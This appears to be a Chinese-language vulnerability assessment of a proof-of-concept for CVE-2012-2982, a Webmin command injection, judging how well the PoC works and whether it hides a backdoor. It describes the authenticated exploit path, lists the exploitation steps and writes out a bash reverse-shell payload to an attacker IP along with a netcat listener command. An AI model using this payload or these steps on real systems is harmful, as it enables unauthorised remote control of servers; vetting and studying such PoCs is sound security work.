## CVE-2012-2982 - Webmin 命令注入/RCE

**漏洞编号:** CVE-2012-2982

**漏洞类型:** 命令注入/RCE

**影响应用:** Webmin

**危害等级:** 高危

**CVSS评分:** CVSS:2.0/AV:N/AC:L/Au:S/C:C/I:C/A:C (分数: 9.0)

**影响版本:** Webmin 1.590 及更早版本

**利用条件:** 需要有效的管理账户凭证（远程身份验证）

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

POC有效性分析：该漏洞存在于Webmin的file/show.cgi组件中。在Webmin 1.590及之前版本中，程序未能正确过滤路径名中的非法字符，导致远程已认证用户可以通过构造恶意的路径参数执行任意系统命令。提供的POC代码采用了Python3编写，使用了requests库进行交互。其核心逻辑分为两个阶段：第一阶段是身份验证，通过POST请求/session_login.cgi获取有效的会话SID；第二阶段是漏洞触发，利用获取的SID构造一个包含管道符（|）的特殊URL请求/file/show.cgi。在POC代码中，路径被构造为/bin/{rand()}|{payload}|，这种构造方式能够绕过基本的路径检查并导致shell命令执行。载荷部分（payload）使用了典型的Bash反弹Shell命令：bash -i >& /dev/tcp/MYIP/PORT 0>&1。经过分析，该POC结构清晰，逻辑符合CVE-2012-2982的公开技术细节，能够直接实现从认证到命令执行的完整路径，具有较高的实战有效性。但需注意，该POC依赖于特定的目录结构（/bin/）和Bash环境，在不同发行版的Linux系统上可能需要微调路径。利用步骤：1. 攻击者准备监听服务器，执行nc -lvp [PORT]；2. 修改POC中的MYIP和PORT为监听端信息；3. 运行脚本并提供目标URL、用户名和密码；4. 脚本首先向/session_login.cgi发送登录请求，若成功则提取Cookie中的sid；5. 脚本携带sid向/file/show.cgi发送带有精心构造路径的POST请求；6. 目标服务器解析非法路径字符，触发命令执行，反弹Shell。投毒风险分析：该POC代码逻辑透明，使用了Python标准库和第三方requests库，未发现明显的代码混淆或恶意加密行为。代码中的rand()函数使用了secrets库生成随机字符串，这是一种安全的做法，目的是为了让请求看起来更具随机性，避免简单的WAF规则拦截，而非恶意投毒。Payload虽然是一个具有破坏性的反弹Shell命令，但这属于POC功能的组成部分，用于验证漏洞的存在，不应判定为针对研究员的投毒行为。脚本中没有发现诸如读取本地敏感文件（如~/.ssh/id_rsa）、向第三方恶意域名发送数据、或下载执行额外二进制文件的后门逻辑。唯一需要警惕的是，使用者必须自行检查MYIP和PORT参数，确保其指向受控环境。总体而言，该POC属于开源社区常见的漏洞验证脚本，投毒风险极低，仅存在因配置不当导致的非预期后果风险。

**项目地址:** n/a

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2012-2982](https://nvd.nist.gov/vuln/detail/CVE-2012-2982)
